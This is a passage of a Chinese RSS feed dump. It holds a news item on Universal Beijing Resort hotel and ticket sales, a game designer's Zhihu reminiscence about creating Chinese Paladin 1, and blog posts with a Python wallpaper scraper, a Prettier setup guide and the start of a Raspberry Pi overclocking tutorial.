data-private-watermark-src=\"v2-87f703909cc511e2e68167e74e9da316\"></p>\n<p><br></p>\n<p>值得关注的是，北京环球度假区内的两家度假酒店——环球影城大酒店及诺金度假酒店的预订价格也在今日公布，于9月14日零时开售。其中，环球影城大酒店的房价为1590元起，诺金度假酒店的房价定为2756元起。入住北京环球度假区环球影城大酒店及诺金度假酒店的游客可享有提前一小时入园的礼遇。</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ba0929c72a205463e5f9f62eecb923b1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1169\" data-watermark=\"original\" data-original-src=\"v2-ba0929c72a205463e5f9f62eecb923b1\" data-watermark-src=\"v2-529ce04de66c003376e1b07dfb04df86\" data-private-watermark-src=\"v2-ad9a470793179fe1d03fe7b3633c679e\"></p>\n<p><br></p>\n<p>作为北京环球度假区首批官方授权合作伙伴之一的同程旅行表示，将在线上同步销售环球影城门票、酒店及相关产品。门票开售信息公布后，用户可以登录同程旅行App或小程序，查看环球影城门票产品和开售时间，并参与抢购。同程旅行也邀请了同程旅行体验官，第一时间为用户分享环球影城的出游攻略和消费体验。</p>\n<p>随着北京环球度假区开园时间临近，越来越多的用户在各大旅行平台搜索并关注相关机票、酒店及门票产品信息。同程旅行大数据显示，对环球度假区开园关注度最高的游客主要来自京津冀周边地区。</p>\n<p>北京周边2-5小时高铁圈内的华中、华东及东北地区的游客也跃跃欲试，对他们来说，只要一个周末就可以前往体验。华南和西南部分地区的游客关注点则集中在中秋、国庆的拼假游，计划在节假日和家人同行。而距北京环球度假区更远的省市居民对此较为“佛系”。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2786d7b95b4ff8b5848571b52f80519e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"875\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-2786d7b95b4ff8b5848571b52f80519e\" data-watermark-src=\"v2-06268f2a5e4821db08a72d7ca1edfaf3\" data-private-watermark-src=\"v2-426aae8d031f19b2fd731a82745dcc52\"></p>\n<p><br></p>\n<p>图/同程旅行供图</p>\n<p>北京环球度假区的开幕，也带动了全国主题乐园的旅游关注度。同程旅行大数据显示，8月以来，不断释放新消息的环球影城赢得了游客的关注。上海迪士尼、北京欢乐谷、珠海长隆海洋王国等众多主题乐园都是国内游客中短途旅行的热门之选。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4d917de6361a7d0c4ba3a56e1e6f6fb5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"875\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-4d917de6361a7d0c4ba3a56e1e6f6fb5\" data-watermark-src=\"v2-90866c690da9088bc2b4a176c1a2ad3a\" data-private-watermark-src=\"v2-0521d189d591056041b15ca043cdba47\"></p>\n<p><br></p>\n<p>图/同程旅行供图</p>\n<p>从区域分布上来看，国内关注度排名前30的主题公园较多集中在京津冀、长三角、珠三角地区，湖南、湖北、安徽等地也有两个以上的主题公园上榜。同程旅行负责人介绍，今年以来，中国游客出行频次显著提升，尤其以48小时左右的周边短途休闲旅游为主，很多游客会在周末或小长假就近选择主题乐园，和亲人朋友共同度过闲暇时光。</p>\n<p>北京环球度假区提醒广大游客，北京环球影城主题公园门票采用实名制购票和验票机制，游客须从官方及官方授权渠道预订及购买门票。游客从非正规渠道购买门票存在无法入园的风险。</p>\n<p>新京报记者：王真真编辑：李铮 校对 卢茜</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xin-jing-bao-95?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">新京报</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484034122/answer/2097402256?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">200 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/296493545?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">火车无座票价应该打折吗？</a><br><a href=\"http://www.zhihu.com/question/461117595?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">一手票务的票价一般是多少？可以估计吗？</a><br>\n","link":"http://www.zhihu.com/question/484034122/answer/2097402256?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"一点一线皆是河山","date":"2021-09-01 07:05:03","description":"\n<p></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-bfcd0a45546f76a31965ccf12b6f80d9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"6273\" class=\"origin_image zh-lightbox-thumb\" width=\"640\" data-original=\"https://pic2.zhimg.com/v2-bfcd0a45546f76a31965ccf12b6f80d9_r.jpg\"></figure><p>一点一线皆是河山。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zi-yuan-zhong-guo?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">资源中国</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/404658754?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价游戏《仙剑奇侠传 1》？","date":"2021-09-01 03:51:01","description":"\n<p><b>如何评价游戏仙剑奇侠传1</b></p>\n<p><br></p>\n<p>知乎的各位朋友大家好，感谢知乎的邀请，分享我对《仙剑奇侠传1》想法。</p>\n<p><br></p>\n<p><b>《仙剑奇侠传》名字由来</b></p>\n<p>当年受到《勇者斗恶龙》和《轩辕剑二》的启发，想做一部有刻骨铭心爱情的RPG游戏成了我们的目标。于是做完《大富翁2》之后，从未做过RPG的我开始规划《仙剑奇侠传》。在当时我们的认知，RPG的和其他类型游戏最大的不同的就是带有说故事。起初，受到环珠楼主《蜀山剑侠》的影响，加上也喜欢金庸大师的武侠小说，所以最初构思的故事有仙侠也有武侠。加上我也喜欢读历史，尤其从安史之乱前后唐朝从极盛走向乱世这段历史，所以最初就选择“安史之乱”做为剧情的时代背景，讲述一个少年侠客在这乱世中的成长故事。当时的我们想呈现一个有武侠、有玄幻、有历史、有爱情、有聊斋的故事。呵呵，现在想起来那时候太贪心了，于是第一年写的剧情越写越收不住，后来几乎全作废，第二年推倒重来。</p>\n<p><br></p>\n<p>自小因为背诗而喜欢上李白和杜甫，所以常希望着游戏中他们能登场。两人都是盛唐时期的大诗人，但因经历不同、诗风迥异：描写悲情的时候需要杜甫，写一个逍遥侠客的时候需要李白。我尤其向往李白描述的侠客精神，那首《侠客行》是真的代表了中国“侠”的境界。</p>\n<p><br></p>\n<p>……十步杀一人，千里不留行。事了拂衣去，深藏身与名。</p>\n<p><br></p>\n<p>本来想以这首诗的名字来命名这个游戏，但这名字金庸大师已经用了，所以最初加上前缀为《逍遥侠客行》。因为故事中的主人公，那个年少侠客的名字就叫李逍遥——是的，这就是李逍遥名字的由来，他之所以姓李就是因为我喜欢李白，名为“逍遥”则是这个人物的性格，少年侠客嘛，就是要自由不羁，逍遥快活的。但是后来随着剧本的大改，越来越觉得《逍遥侠客行》的名字不完全适合，后来重新想新名字《仙剑奇侠传》，同时兼具仙与侠的元素，而且有种潇洒不羁感。</p>\n<p><br></p>\n<p><b>女娲传说</b></p>\n<p>在决定必须带有玄幻、神话的成分之后，选择哪位神仙成为游戏中的核心元素呢？我想要一位不带宗教色彩的、有发挥空间、形象正面的女神。找了一些资料后，最终进入我们视线的只剩下女娲娘娘。我个人非常喜欢女娲的传说，但是除了补天和造人以外，其他的素材并不多，反而让我们有不小的发挥空间。</p>\n<p><br></p>\n<p><b>李逍遥</b></p>\n<p>在男主角的设定上，我们想用李逍遥这样一个凡人小伙子的起点，从而与后来的玄幻情节形成了巨大的起伏效果。这个生于市井、长于江湖，命犯桃花的 “坏小子”形象下，有着一颗朴实、仗义、和责任感的心。这种外表和内心的反差，是他的人物魅力所在。结果证明，李逍遥那出身平凡却不甘于平凡的形象获得了许多人的共鸣，我想是因为现实世界的你我内心也大多是这样的。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e4784523aa97677c902ff005789b6561_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"1173\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>赵灵儿</b></p>\n<p>要成为李逍遥和大家心目中的“仙女”，绝对不能是寻常人物，无论是容貌、个性、背景都要非常特别，甚至背负很大的使命才能创造剧情效果。所以，灵儿她有了一个不同凡响的身世——女娲族的后裔；赵灵儿在和李逍遥相遇之后，不仅成为推动游戏主线的灵魂人物之一，开始跟李逍遥演绎了一见钟情式的牛郎织女式的浪漫奇遇，更成为了整个冒险故事的开场。</p>\n<p><br></p>\n<p>赵灵儿的气质如莲花不染纤尘，她需要保护疼惜，她无条件的信任和依赖李逍遥；这就是灵儿，内心只是一个单纯的女孩，渴望着属于自己简单的幸福，“逍遥哥哥陪我去街上逛一逛”就足够满足。但是她面对自己宿命和使命的时候，又显得那么是执着和倔强的。她就像是传统女性的代表，也是男性梦想中完美女性的化身的代表。而她以完美的形象出现在剧情里，以无比遗憾的结局香消玉殒，从某种意义上讲，这个角色就是用来营造“完美与缺憾”的冲突感的，赵灵儿用自己的一声叹息诠释了因为这个世界就是不完美的真谛。</p>\n<p><br></p>\n<p>赵灵儿的原型部分来自我大专时一位邻桌女同学，是当时全班仅有的四位女同学，是班上许多理工男单方面远远欣赏的班花，包括我。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4e9fb730a7991e74c0168ab54f5ca152_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"1173\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>林月如</b></p>\n<p>林月如，一个现实世界的刁蛮的千金小姐。她拥有一身武艺，她独立而又、她痴情，在机缘巧合之下毅然决然地放弃一切、义无反顾的追随李逍遥。林月如最伟大的地方，其实是甘愿做李逍遥寻找灵儿漫长旅途中相互扶持的知己，不计回报甚至甘愿为自己爱的人付出生命。</p>\n<p>林月如也是完美的，相比赵灵儿；林月如美的更真实的。她的爱，是一种最纯粹的付出。</p>\n<p><br></p>\n<p>林月如的原型部分来自当时一位女同事，是当时极为阳盛阴衰的研发部中仅有的女生之一。网上流传仙剑悲剧式剧情是因为我当时失恋而写的，我必须再次澄清，现实世界里我并没有在制作《仙剑1》过程中失恋——只是第二次单方面……因为压根没人跟我这位宅男恋过，所以不能算失恋。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1be2082955b7518741122a33ad15b32a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"1173\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>阿奴</b></p>\n<p>阿奴这个角色在女一、女二号比较明确之后，女三号一直没想好，但是固执的我一直想要有一个苗族少女，只因为我蛮喜欢苗族元素，所以想要有一个苗族少女在游戏里，于是后来就有了阿奴，。刁钻伶俐得连令李逍遥都颇感无可奈何的妹妹类型的角色，而关键时刻却又挺身而出的阿奴，也是我很喜欢的人物。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6fc099e90faed35bc300d6f5f7e4e1a3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"1173\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><br></p>\n<p><b>结局设计</b></p>\n<p>因为游戏开发到第二年是在废弃了原大纲，未确定后面剧情发展下直接做一张地图写一章对白的很不正规方式推进，所以我们当时对白写到锁妖塔剧情结尾时，大家都还不知道如何解释之前立下的”入锁妖塔从无人生还“的flag，于是必然要有人牺牲才合理。谁会死？当时内部争议很大，我做出锁妖塔结局林月如牺牲的主张，策划极力反对，项目组里绝大部分人也不支持，当时游戏没有这种先例！但是基于塑造人物高光时刻的需要，我很坚持，于是谁都说服不了谁，这种争论持续了很久，甚至有人说为何不安排南海神尼把林月如带走。我的主张这在当时看起来是冒很大风险的，以前从没有游戏这么做的！如果把玩家喜欢的人物给写死了，喜欢这人物的玩家会恨你一辈子……</p>\n<p><br></p>\n<p>但是我们也很想做出一个跟过去不一样的故事，这很矛盾。这时，林坤信用《雪山飞狐》的结局给了我建议和信心，这部小说是一个没有结局的结局，小说里男主角跟女主角的爸爸的一个决战……林坤信说这手法留悬念，这是金庸所有的小说当中结局跟其他作品最不一样的。我仔细研究后，心里更笃定了。接下来，我还是强硬坚持把锁妖塔结局巨石落下的剧情动画安排制作，但又安排圣姑三十六只傀儡虫的暗示情节。</p>\n<p><br></p>\n<p>后来写到大结局的时候，大家一听说赵灵儿也被我安排英勇牺牲了，大家愤怒的眼神让我觉得真正该死的人其实是我……但最终结果验证，这样的结局虽然伤感，但是让人念念不忘……</p>\n<p><br></p>\n<p>对于仙剑1的结局，我是这么看的：你看到的结尾像是像悲剧，但是它隐含一份补偿的希望也伴随其中；人生总有得也有失，命运是无情的也是公平的，当命运关上一扇门，也会打开另一扇们，只是需要我们懂得珍惜。</p>\n<p><br></p>\n<p><b>仙音</b></p>\n<p>《仙剑》里只有音乐我没有参与制作的，因为我不会，幸好我们请到一位天才音乐师——林坤信，被许多玩家奉为经典的《蝶恋》的MIDI原曲便是出自他手。当时他还不是大宇内部的员工，而是承包《仙剑》音乐的独立音乐师，他常常来和我们讨论，包括剧情，以便让音乐更好的贴合游戏。他不是那种纯粹只制作音乐，也对编剧很有想法，他的意见很有帮助，毕竟我们的剧情理念颇为相融，常常能碰撞出一些火花。有时候我们在想某段剧情，他会提出他的建议和想法，包括剧情最后结局采取留白手法就是他提的建议。</p>\n<p><br></p>\n<p><b>意外之悲喜</b></p>\n<p>让我想不到的事情是，不久之后竟然由于《仙剑》影响力，我得以找到了父亲失散数十年的亲人。</p>\n<p><br></p>\n<p>那是2002年的某一天，我收到了一个玩家的来信，信的内容令我无比震惊…… 他来信并不是像其他玩家那样来倾诉他们对《仙剑》的意见，而是在来信中提出了一个他对我个人身世的推测。</p>\n<p><br></p>\n<p>原来他接触仙剑时，注意到我的名字叫姚壮宪，和他舅舅们的名字都只差末尾一个字，都叫姚壮什么的，而他母亲家族中同辈兄弟的名字中的“壮”是根据家族谱而来的“壮”字辈，他们老家在江苏省连云港东海县。</p>\n<p><br></p>\n<p>这是一种巧合么？可能我是他亲戚？他听长辈们说过，有一位舅公1949年时去了台湾省，从此渺无音讯。于是他写来一封信，把他的猜测写在了信里头。我立刻给我妈打电话求证，随后按照来信留的联系方式和那边的亲戚联系上。</p>\n<p><br></p>\n<p>不久我赶赴连云港，得知我爸爸的四弟仍健在，也就是我的四叔，和我四婶和堂哥堂嫂一家在连云港市区定居，还有很多亲戚在东海县老家，跟我同辈份叫姚壮什么的很多，但年纪都比我大许多，原因是我爸年纪很大才结婚生子，所以我是同辈中最年纪小的。这些年他们也曾打听我们的下落，但是小时候我父亲走的早，加上那几年频繁的搬家，和父亲在台仅有的亲戚朋友都失联了。</p>\n<p><br></p>\n<p>认祖归宗当然欣慰，不过有遗憾，我们是在2002年联系上的，当时我奶奶二个月前刚过世。四叔很难过，他对我说，奶奶期盼了一辈子，如果再早两个月，就可以知道失散几十年儿子的下落，和看到孙子认祖归宗……</p>\n<p><br></p>\n<p><b>我心中的《仙剑》</b></p>\n<p>《仙剑》从来不是任何一个人的，而且没有任何一个人能独自代表这个系列。《仙剑》的今天是很多人的心血聚集而来的。《仙剑》里面有很多不同亮点，这些亮点就是多人智慧发酵的结果。对于《仙剑》来说如果想要做得更好，就必须让更多有能力的人参与进来，不断有新鲜的血液融入，才能持续升华。我相信有传承也有创新，《仙剑》生命力才能更长久。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yao-xian-37-48?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">姚仙</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/456525633/answer/2096523881?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">57 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/31467553?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么那么多人黑《仙剑奇侠传》这个游戏？</a><br><a href=\"http://www.zhihu.com/question/31190018?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价仙剑奇侠传六中出现的各种其他游戏的元素？</a><br>\n","link":"http://www.zhihu.com/question/456525633/answer/2096523881?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            